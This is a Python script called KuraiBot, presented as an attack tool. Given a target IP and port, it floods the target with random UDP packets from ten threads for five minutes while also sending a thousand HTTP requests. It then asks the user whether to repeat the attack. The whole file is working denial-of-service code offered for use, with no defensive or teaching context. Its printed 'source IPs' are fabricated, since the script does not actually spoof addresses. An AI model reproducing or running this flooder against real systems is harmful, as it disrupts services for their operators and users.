import sys
import socket
import threading
import random
import struct
import time
import requests

# ASCII art for KuraiBot
ascii_art = """
   ▄█   ▄█▄ ███    █▄     ▄████████    ▄████████  ▄█  ▀█████████▄   ▄██████▄      ███          
  ███ ▄███▀ ███    ███   ███    ███   ███    ███ ███    ███    ███ ███    ███ ▀█████████▄      
  ███▐██▀   ███    ███   ███    ███   ███    ███ ███▌   ███    ███ ███    ███    ▀███▀▀██      
 ▄█████▀    ███    ███  ▄███▄▄▄▄██▀   ███    ███ ███▌  ▄███▄▄▄██▀  ███    ███     ███   ▀      
▀▀█████▄    ███    ███ ▀▀███▀▀▀▀▀   ▀███████████ ███▌ ▀▀███▀▀▀██▄  ███    ███     ███          
  ███▐██▄   ███    ███ ▀███████████   ███    ███ ███    ███    ██▄ ███    ███     ███          
  ███ ▀███▄ ███    ███   ███    ███   ███    ███ ███    ███    ███ ███    ███     ███          
  ███   ▀█▀ ████████▀    ███    ███   ███    █▀  █▀   ▄█████████▀   ▀██████▀     ▄████▀        
  ▀                      ███    ███                                                     
"""

class KuraiBot:
    def __init__(self, target_ip, target_port):
        self.target_ip = target_ip
        self.target_port = target_port
        self.attack_duration = 300  # Attack duration in seconds
        self.attack_interval = 1  # Interval between attack threads in seconds

    def random_ip(self):
        return socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))

    def send_packets(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        end_time = time.time() + self.attack_duration
        while time.time() < end_time:
            source_ip = self.random_ip()
            payload = bytes(random.randint(0, 255) for _ in range(1024))
            sock.sendto(payload, (self.target_ip, self.target_port))
            print(f"Sent packet from {source_ip} to {self.target_ip}")
            time.sleep(0.001)  # Throttle attack speed

    def start_volumetric_attack(self):
        threads = []
        for _ in range(10):  # Create 10 attack threads
            thread = threading.Thread(target=self.send_packets)
            thread.start()
            threads.append(thread)

        # Wait for all attack threads to complete
        for thread in threads:
            thread.join()

        print("Volumetric attack initiated! Get ready for the impact.")

    def custom_attack(self):
        # Send HTTP requests to target website
        url = f"http://{self.target_ip}:{self.target_port}"
        try:
            for _ in range(1000):  # Send 1000 requests
                response = requests.get(url)
                print(f"Sent HTTP request to {url}. Response: {response.status_code}")
                time.sleep(0.1)  # Throttle request speed
        except Exception as e:
            print(f"Error occurred during custom attack: {e}")

    def start_attack(self):
        volumetric_thread = threading.Thread(target=self.start_volumetric_attack)
        custom_thread = threading.Thread(target=self.custom_attack)
        volumetric_thread.start()
        custom_thread.start()
        volumetric_thread.join()
        custom_thread.join()

if __name__ == "__main__":
    if len(sys.argv) == 2 and sys.argv[1] == "--help":
        print("Usage: python kurai_bot.py <target_ip> <target_port>")
        sys.exit(0)
    
    print(ascii_art)
    if len(sys.argv) != 3:
        print("Usage: python kurai_bot.py <target_ip> <target_port>")
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    kurai_bot = KuraiBot(target_ip, target_port)
    kurai_bot.start_attack()

    # Prompt user to continue or restart attack
    while True:
        user_input = input("Do you want to continue the attack? (yes/no): ").lower()
        if user_input == "yes":
            kurai_bot.start_attack()
        elif user_input == "no":
            print("Attack stopped.")
            break
        else:
            print("Invalid input. Please enter 'yes' to continue or 'no' to stop.")
